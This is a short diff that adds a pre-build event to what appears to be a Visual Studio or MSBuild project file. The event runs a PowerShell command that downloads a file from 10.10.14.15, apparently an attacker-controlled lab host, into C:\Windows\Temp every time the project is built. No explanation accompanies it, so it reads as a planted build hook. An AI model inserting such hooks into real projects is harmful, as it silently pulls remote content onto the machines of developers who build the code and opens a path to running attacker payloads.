@@ -1,0 +1,5 @@
+<PreBuildEvent>
+    <Command>
+    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15/test.txt', 'c:\Windows\Temp')"
+    </Command>
+</PreBuildEvent>
